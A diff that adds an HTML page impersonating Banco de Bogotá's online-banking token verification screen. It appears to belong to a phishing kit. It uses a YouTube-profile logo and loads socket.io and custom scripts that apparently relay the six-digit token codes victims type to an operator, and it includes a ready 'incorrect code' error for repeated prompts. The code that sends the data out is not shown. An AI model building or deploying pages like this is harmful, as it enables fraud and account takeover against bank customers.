@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Verificación de Token - Banco de Bogotá">
+    <meta name="theme-color" content="#002A8D">
+    
+    <title>Verificación de Token - Banco de Bogotá</title>
+    
+    <!-- Favicons -->
+    <link rel="icon" type="image/png" href="Imagenes/channels4_profile-removebg-preview.png">
+    <link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
+    
+    <!-- Estilos -->
+    <link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
+    <link rel="stylesheet" href="token.css?v=1.0.2">
+    
+    <!-- Scripts -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="js/socket-new.js"></script>
+    <script src="js/token-new.js" defer></script>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="loading-spinner">
+                <div class="spinner-ring"></div>
+            </div>
+            <p class="loading-text">Cargando</p>
+            <p class="loading-subtext"></p>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="nav-left">
+            <a href="javascript:history.back()" class="back-btn">← Atrás</a>
+        </div>
+        <div class="nav-center">
+            <h1>Ingreso a Banca Virtual</h1>
+        </div>
+        <div class="nav-right">
+            <button onclick="window.close()" class="abandon-btn">Abandonar ×</button>
+        </div>
+    </div>
+
+    <div class="login-section">
+        <h2>Verifiquemos que seas tú</h2>
+        
+        <div class="token-container">
+            <div class="token-icon">
+                <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Token Icon" class="bank-logo">
+            </div>
+            <div class="token-content">
+                <h3>Código Token <span class="info-icon">ⓘ</span></h3>
+                <p>Para realizar este proceso, ingresa el código de Token móvil o físico.</p>
+                
+                <div class="token-input-container">
+                    <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]">
+                    <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]">
+                </div>
+
+                <button class="verify-btn" disabled>Verificar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mensaje de error -->
+    <div class="error-message" style="display: none;">
+        <p>⚠️ El código token ingresado es incorrecto. Por favor intente nuevamente.</p>
+    </div>
+
+    <script>
+        // Validación inline para habilitar botón de verificar
+        (function() {
+            const tokenInputs = document.querySelectorAll('.token-digit');
+            const verifyBtn = document.querySelector('.verify-btn');
+            
+            function validateToken() {
+                const allFilled = Array.from(tokenInputs).every(input => input.value.trim().length === 1);
+                
+                if (verifyBtn) {
+                    verifyBtn.disabled = !allFilled;
+                }
+            }
+            
+            tokenInputs.forEach(input => {
+                input.addEventListener('input', validateToken);
+            });
+            
+            validateToken();
+        })();
+    </script>
+</body>
+</html>
